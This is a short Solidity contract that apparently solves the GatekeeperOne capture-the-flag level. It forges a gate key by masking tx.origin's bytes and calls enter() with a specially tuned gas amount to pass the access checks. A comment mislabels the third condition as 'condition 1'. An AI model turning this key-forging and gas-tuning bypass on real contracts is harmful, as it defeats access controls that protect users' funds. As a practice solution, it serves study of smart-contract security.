// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Script, console2} from "forge-std/Script.sol";

import "./Level13.sol";

contract Attack {
    function atatatak(GatekeeperOne _instance) public payable {
        //              0x b1 b2 b3 b4 b5 b6 b7 b8
        // condition 1: 0x                   FF FF
        // condition 2: 0x             00 00 FF FF
        // condition 1: 0x FF FF FF FF 00 00 FF FF

        bytes8 addrInBytes = bytes8(uint64(uint160(tx.origin)));
        bytes8 mask = 0xFFFFFFFF0000FFFF;
        bytes8 key = addrInBytes & mask;

        _instance.enter{gas: 5 * 8191 + 256}(key);
    }
}
